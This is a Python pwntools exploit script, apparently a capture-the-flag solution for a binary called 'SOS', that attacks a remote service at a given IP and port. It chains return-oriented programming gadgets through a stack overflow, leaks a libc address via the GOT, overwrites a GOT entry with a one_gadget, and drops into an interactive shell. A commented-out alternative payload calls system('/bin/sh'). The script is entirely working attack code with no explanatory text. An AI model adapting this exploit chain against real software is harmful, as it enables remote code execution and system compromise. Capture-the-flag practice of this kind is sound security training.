#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
pwn_file="./SOS"
elf=ELF(pwn_file)

libc=ELF("./bc.so.6")


if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
else:
    r=remote("39.96.8.50",9999)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    pause()

leave_ret = 0x400afa
poprdi_ret = 0x400c53
puts = 0x4008E0
main = 0x400AFC
csu_init = 0x400C4A
csu_call = 0x400C30
bss = 0x0602000
heap = 0x603000
read_buf = bss + 0x100
read_pos = 0x602030
new_stack = 0x0602000 + 0x500
one_gadget_70 = 0x10a38c
one_gadget_40 = 0x4f322


r.sendlineafter("size: \n","1")
pad = '\x00'*0x2000
payload = "a"*0x38 + p64(poprdi_ret) + p64(elf.got['scanf']) +p64(puts)
payload+= p64(csu_init) + p64(0)+ p64(1) + p64(read_pos) + p64(0x2000)+p64(read_buf)+ p64(0)  + p64(csu_call)
payload+= p64(0) + p64(0)+ p64(1) +  p64(read_pos) + p64(0x8) + p64(elf.got['setbuf']) +p64(0) + p64(csu_call)

payload+= p64(0)*7 +  p64(main) + pad 

debug()
r.sendafter("code: \n",payload)

w = r.recv(6)
scanf_libc_addr =u64(w +chr(0)+chr(0))
libc.address = scanf_libc_addr - libc.sym["scanf"]
print "+++libc.address: "+hex(libc.address)
system= libc.sym['system']
binsh = list(libc.search("/bin/sh"))[0]

debug()
r.sendline(p64(libc.address+one_gadget_40))

debug()

'''
r.recvuntil("size: \n")
r.sendline("1")
payload2 = 'a'*38 + p64(poprdi_ret)+ p64(binsh)+ p64(system) +pad 
r.sendafter("code: \n",payload2)
'''
r.interactive()
